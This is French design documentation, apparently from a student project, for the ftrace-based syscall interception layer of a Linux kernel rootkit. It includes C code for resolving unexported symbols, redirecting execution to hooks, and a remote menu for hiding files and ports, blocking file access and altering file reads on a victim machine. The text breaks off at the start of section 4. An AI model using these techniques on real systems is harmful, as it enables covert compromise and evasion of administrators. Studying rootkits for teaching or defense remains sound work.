\page hooks Hooks
\tableofcontents

## 1. 🌐 Introduction

Ce document décrit de manière précise et détaillée le fonctionnement de l’architecture `interceptor` utilisée dans le rootkit pour intercepter, modifier et contrôler les appels système sous Linux.
L’objectif principal du composant interceptor est de fournir un cadre uniforme pour :
- Capturer une liste configurable d’appels système.
- Injecter du code avant et/ou après l’exécution native.
- Modifier les arguments (entrée) et/ou le résultat (sortie).
- Activer/désactiver dynamiquement chaque hook selon des fichiers spécifiques.

```bash
interceptor
├── core
│   ├── include
│   │   ├── ftrace.h
│   │   ├── init.h
│   │   └── menu.h
│   ├── array.c               # Gestion des tableaux dynamiques de hooks
│   ├── ftrace.c              # Implémentation du mécanisme ftrace
│   ├── init.c                # Module init/exit avec fichiers par défaut.
│   └── menu.c                # Menu pour ajouter/enlever des fichiers à traiter
└── hooks
    ├── alterate              # Module d’altération        
    │   ├── alterate_api.c
    │   ├── alterate_api.h
    │   ├── alterate.c
    │   └── alterate.h
    ├── forbid                # Module d’interdiction
    │   ├── forbid_api.c
    │   ├── forbid_api.h
    │   ├── forbid.c
    │   └── forbid.h
    └── hide                  # Module de camouflage
        ├── hide_api.c
        ├── hide_api.h
        ├── hide.c
        └── hide.h
```

## 2. 🏛️ Historicité

Intercepter un appel système dans le noyau Linux peut se faire par plusieurs approches, chacune avec ses compromis en termes de performance, stabilité et complexité. D'après nos recherches, l’une des méthodes les plus directes consiste à remplacer une entrée dans la table des appels système (`sys_call_table`) par un pointeur vers une fonction *wrapper*. Dans cette approche, dès que le noyau invoque un numéro de syscall correspondant à l’index visé, il est redirigé vers notre routine. Si elle est simple à implémenter et à comprendre, à partir des versions 5.x du noyau, la table n’est plus exportée et devient non-modifiable (écriture protégée), rendant cette technique assez instable... Nous souhaitions avoir une version du kernel la plus récente possible, donc nous avons cherché une autre façon de faire.

Nous avons également envisagé d’utiliser les `kprobes`, qui insèrent un breakpoint (`int3`) à une adresse précise correspondant au début d’une fonction ou d’une instruction cible. Lorsqu’un processus appelle la fonction interceptée, le noyau déclenche une exception et exécute notre gestionnaire de `kprobe`. Cette approche offre une granularité très fine, car elle peut cibler presque n’importe quelle fonction, y compris des fonctions internes non accessibles par un nom de symbole standard. En revanche, déclencher un *trap* à chaque invocation engendre un surcoût non négligeable, et maintenir cette solution sur les versions récentes du noyau peut devenir complexe.. De plus, la présence de nombreux `kprobes` simultanés peut provoquer un afflux d’interruptions, ce qui dégrade sensiblement les performances.

C’est pour cette raison que nous nous sommes tournés vers `ftrace`, l’infrastructure d’instrumentation native du noyau (notamment utilisé pour mesurer les performances, faire des call graphs, etc). L’API expose des mécanismes comme `register_ftrace_function` ou la structure `ftrace_ops`, permettant de définir des callbacks qui reçoivent la structure `pt_regs *` en paramètre. À partir de là, il devient possible de lire ou modifier les registres, de décider d’appeler la fonction originale ou de renvoyer directement un code d’erreur, et même de modifier la valeur de retour.

## 3. ⚙️ Composants cœur

### 3.1 🔍 Mécanisme ftrace

Le mécanisme ftrace du module `interceptor` repose sur deux fichiers principaux : core/include/ftrace.h (définitions, structures et prototypes) et core/ftrace.c (implémentation des fonctions pour installer et supprimer des hooks). Cette section détaille le rôle et le fonctionnement de chaque composant. 

#### 3.1.1 Fondations
```c
struct ftrace_hook{
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};
```

Nous utilisons une structure de base, `ftrace_hook`, qui regroupe plusieurs champs. Le champ `name` contient le nom du symbole que l’on souhaite surveiller. Le champ `function` sert à pointer vers notre fonction *custom*. De plus, le champ `address` est utilisé pour conserver l'adresse grâce à la fonction `kallsyms_lookup_name()` trouvée via un `kprobe` (voir plus bas). Pour que notre *wrapper* puisse invoquer la fonction originale, on stocke aussi l’adresse de la fonction native dans `original`. Dans le code de `fh_install_hook(struct ftrace_hook *hook)` de `ftrace.c`, on observe :
```c
hook->address = kallsyms_lookup(hook->name);
if (!hook->address) {
        ERR_MSG("ftrace: unresolved symbol\n");
        return -ENOENT;
    }

*((unsigned long *)hook->original) = hook->address;
``` 
Ici, la première ligne résout l’adresse du symbole et la stocke dans `hook->address`. Cette valeur sert ensuite à instruire ftrace :
```c
ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
```
Quant à `hook->original`, il pointe vers une variable de type `unsigned long` définie dans le module de hook lui-même (par exemple, `__orig_read` dans le cas d’un hook sur `read`) et permet au *wrapper*, plus tard, d’appeler la vraie fonction noyau. Par exemple, dans `alterate.c`, on aura :
```c
asmlinkage long (*__orig_read)(const struct pt_regs *) = NULL;

asmlinkage long notrace read_hook(const struct pt_regs *regs) {
    long ret = __orig_read(regs);
    if (ret <= 0)
        return ret;
    ...
}
```
Ce n’est pas forcément essentiel, mais ça simplifie le code. La structure contient enfin un élément `ops` de type `struct ftrace_ops`, qui sert à communiquer avec l’API ftrace.

#### 3.1.2 Macros

Pour faciliter la déclaration d’un hook sur un syscall, nous avons introduit deux macros. `SYSCALL_NAME(name)` préfixe automatiquement la chaîne par "__x64_", de sorte que l’on n’ait pas à écrire manuellement le nom exact du symbole. La macro `HOOK_SYS(_name, _hook, _orig)` simplifie ensuite l’initialisation d’un élément `ftrace_hook` en lui fournissant en une seule ligne le nom du syscall, l’adresse de notre fonction de hook et la variable où sera stocké le pointeur original. Pour des fonctions du noyau qui ne sont pas des syscalls, on peut utiliser la macro plus générique `HOOK(_name, _hook, _orig)`.
```c
#define SYSCALL_NAME(name) ("__x64_" name)
#define HOOK_SYS(_name, _hook, _orig) {					\
    .name = SYSCALL_NAME(_name),                        \
    .function = (_hook),                                \
    .original = (_orig),                               	\
}

#define HOOK(_name, _hook, _orig) {					    \
    .name = (_name),                                    \
    .function = (_hook),                                \
    .original = (_orig),                               	\
}
```

Le reste de ftrace.h se compose surtout de prototypes. 
- `fh_init_kallsyms_lookup(void)` sert à récupérer un pointeur vers la fonction interne `kallsyms_lookup_name()`, en installant temporairement un kprobe.
- `fh_install_hook(struct ftrace_hook *hook)` et `fh_remove_hook(struct ftrace_hook *hook)` gèrent respectivement l’installation et la suppression d’un hook.
- `fh_install_hooks(struct ftrace_hook *hooks, size_t count)` et `fh_remove_hooks(struct ftrace_hook *hooks, size_t count)` permettent de gérer en bloc un tableau de hooks.

La liste de l’ensemble des hooks implémentés peut être retrouvée dans `array.c` :
```c
struct ftrace_hook hooks[] = {
    HOOK_SYS("sys_getdents64", getdents64_hook, &__orig_getdents64),
    HOOK_SYS("sys_read", read_hook, &__orig_read),
    HOOK_SYS("sys_openat", openat_hook, &__orig_openat),
    HOOK_SYS("sys_newfstatat", stat_hook, &__orig_newfstatat),
    HOOK_SYS("sys_fstat", stat_hook, &__orig_fstat),
    HOOK_SYS("sys_lstat", stat_hook, &__orig_lstat),
    HOOK_SYS("sys_stat", stat_hook, &__orig_stat),
    HOOK_SYS("sys_recvmsg", recvmsg_hook, &__orig_recvmsg),
    HOOK_SYS("sys_chdir", chdir_hook, &__orig_chdir),
    HOOK_SYS("sys_ptrace", ptrace_hook, &__orig_ptrace),

    HOOK("tcp4_seq_show", tcp4_seq_show_hook, &__orig_tcp4_seq_show),
    HOOK("tcp6_seq_show", tcp6_seq_show_hook, &__orig_tcp6_seq_show)
};

size_t hook_array_size = sizeof(hooks) / sizeof(hooks[0]);
```

#### 3.1.3 kallsyms

Afin de résoudre l’adresse de `kallsyms_lookup_name()` et de pouvoir localiser dynamiquement les symboles non exportés, nous avons créé un kprobe temporaire, pour ensuite lire l’adresse retournée dans `kp.addr` dès que `register_kprobe` réussit. Cette opération est exécutée une seule fois : on stocke l’adresse dans une variable statique pour éviter d’interroger le noyau à chaque hook.
```c
typedef unsigned long (*kallsyms_lookup_name_t)(const char *);
static kallsyms_lookup_name_t fh_kallsyms_lookup_ptr = NULL;
int ret;
struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};

if (fh_kallsyms_lookup_ptr)
    return fh_kallsyms_lookup_ptr;

ret = register_kprobe(&kp);
if (ret < 0) {
    ERR_MSG("fh_init_kallsyms_lookup: register_kprobe failed\n");
    return NULL;
}

fh_kallsyms_lookup_ptr = (kallsyms_lookup_name_t)kp.addr;
unregister_kprobe(&kp);
```

#### 3.1.5 fh_install_hook

Une fois la fonction `kallsyms_lookup_name()` disponible, la suite du processus repose sur la fonction `fh_install_hook(struct ftrace_hook *hook)`. Elle prend en argument un pointeur vers une structure `ftrace_hook`. On appelle d’abord `kallsyms_lookup(hook->name)` pour récupérer l’adresse effective de la fonction cible dans le noyau. Si cette adresse est valide, on la copie immédiatement dans la variable hook->original, afin qu’elle pointe désormais vers la fonction native. Donc, à chaque fois que dans notre fonction *custom* nous souhaitons invoquer l’implémentation de base, nous lirons l’adresse stockée dans `*hook->original`.
```c
int err;
unsigned long (*kallsyms_lookup)(const char *) = fh_init_kallsyms_lookup();
if (!kallsyms_lookup) {
    ERR_MSG("ftrace: unable to get kallsyms_lookup_name pointer\n");
    return -ENOENT;
}

hook->address = kallsyms_lookup(hook->name);
if (!hook->address) {
    ERR_MSG("ftrace: unresolved symbol\n");
    return -ENOENT;
}

*((unsigned long *)hook->original) = hook->address;

hook->ops.func = fh_ftrace_thunk;
hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS 
                | FTRACE_OPS_FL_RECURSION 
                | FTRACE_OPS_FL_IPMODIFY;

err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
if (err) {
    ERR_MSG("ftrace: ftrace_set_filter_ip() failed.\n");
    return err;
}

err = register_ftrace_function(&hook->ops);
if (err) {
    ERR_MSG("ftrace: register_ftrace_function() failed.\n");
    return err;
}
return 0;
```
Ensuite, on configure `hook->ops`. On définit son champ `func` pour qu’il pointe vers notre callback `fh_ftrace_thunk`. Cette dernière est appelée par ftrace juste avant que la fonction native soit exécutée. Dans `ops.flags`, on combine trois options ci-dessous. Pour plus de détails, voir [The Linux Kernel](https://www.kernel.org/doc/html/v5.3/trace/ftrace-uses.html):
- `FTRACE_OPS_FL_SAVE_REGS` pour sauvegarder automatiquement le contexte des registres,
- `FTRACE_OPS_FL_RECURSION` prévient la récursion si le callback appelle une fonction déjà surveillée (ouch),
- `FTRACE_OPS_FL_IPMODIFY` autorise la modification du registre d’instruction (RIP), donc en gros la base du fonctionnement de ftrace pour notre cas.

Une fois ces champs positionnés, on doit informer ftrace quelles adresses doivent etre surveillées. C’est le rôle de `ftrace_set_filter_ip`, à laquelle on passe l’adresse calculée `hook->address` et un indicateur à 0 pour signifier un ajout. Enfin, on appelle `register_ftrace_function(&hook->ops)` pour que le noyau appelle systématiquement `fh_ftrace_thunk` lorsqu’une invocation à cette adresse se produit.

#### 3.1.4 fh_ftrace_thunk

Dès qu’elle est invoquée, cette fonction récupère la structure `ftrace_hook *` grâce à `container_of` (fonction magique), puis vérifie que le `parent_ip` ne provient pas du module lui-même. Enfin, on modifie le registre RIP (`regs->ip`) pour qu’il pointe vers notre *wrapper*. Ainsi, lorsque ftrace rend la main, le flux d’exécution sautera directement vers la fonction de hook au lieu d’appeler la fonction native ahah !
```c
struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
  if (!within_module(parent_ip, THIS_MODULE))
    ((struct pt_regs *)regs)->ip = (unsigned long)hook->function;
```

#### 3.1.6 Autre

> Les autres fonctions de ftrace.c permettent de gérer la liste des hooks à installer, ainsi que le désenregistrement des hooks ftrace (fh_remove_hook, fh_install_hooks et fh_remove_hooks).

### 3.2 ⚙️ API

Comme mentionné dans la section [Utilisation](dc/da7/md_pages_204__usage.html), les hooks disposent d’un sous-menu spécifique défini dans `menu.c`, permettant d’interagir facilement à distance avec les différentes fonctions. Ce menu repose sur la même structure et les mêmes principes que celui de `cmd.c`. Pour chaque catégorie, trois commandes sont disponibles : une pour ajouter un hook, une pour le supprimer, et une pour lister les éléments actuellement affectés par un hook ftrace. Ci-dessous figure un aperçu de ce menu et des différentes fonctions associées. Lors de l’utilisation, il suffit d’exécuter la commande help pour afficher l’ensemble des commandes disponibles. Chaque liste de fichiers affectés par les hooks est dynamique et enregistrée dans des fichiers de configuration sur la machine victime. Ainsi, à chaque redémarrage, la configuration est automatiquement restaurée.
```c
static struct command hooks_commands[] = {
    { "hide", 4, "hide a file or directory (getdents64 hook)", 43, hide_dir_handler },
    { "unhide", 6, "unhide a file or directory", 32, unhide_dir_handler },
    { "list_hide", 9, "list hidden files/directories", 34, list_hidden_handler },
    { "add_port", 8, "add port to hide", 16, hide_port_handler },
    { "remove_port", 11, "remove hidden port", 18, unhide_port_handler },
    { "list_port", 9, "list hidden ports", 17, list_hidden_port_handler },
    { "forbid", 6, "forbid open/stat on a file (openat/stat/lstat... hook)", 55, forbid_file_handler },
    { "unforbid", 8, "remove forbid on a file", 30, unforbid_file_handler },
    { "list_forbid", 11, "list forbidden files", 30, list_forbidden_handler },
    { "modify", 6, "[CAREFUL] modify a file with hide/replace operation (read hook)", 64, modify_file_handler },
    { "unmodify", 8, "unmodify a file", 30, unmodify_file_handler },
    { "list_modify", 11, "list alterate rules", 30, list_alterate_handler },
    { "help", 4, "display hooks help menu", 25, hooks_help },
    { NULL, 0, NULL, 0, NULL }
};
```

### 3.3 🚀 Initialisation

Le fichier `init.c` est appelé dès l’insertion du rootkit et permet de gérer les fichiers pris en charge par défaut. Il installe les hooks via ftrace, initialise les différentes configurations en récupérant les fichiers associés, puis les charge en mémoire. Ces fichiers de configuration se trouvent dans un répertoire spécifique, `/var/lib/systemd/.epirootkit-hidden-fs` (dont l’accès est restreint). Les noms des fichiers sont paramétrables dans `include/config.h` et incluent notamment :
- `hide_list.cfg`
- `forbid_list.cfg`
- `alterate_list.cfg`
- `passwd.cfg`
- `hide_ports.cfg`
- `std.out`
- `std.err`

> Par ailleurs, ce fichier gère également le déchargement du rootkit, en s’occupant de la désinstallation des hooks et de la mise à jour des fichiers de configuration.

## 4. 🪝 Hooks

### 4.1

La partie hide du rootkit est chargée de masquer deux catégories principales d’éléments au sein du système :



<img 
  src="logo_no_text.png" 
  style="
    display: block;
    margin: 100px auto;
    width: 30%;
    overflow: hidden;
  "
/>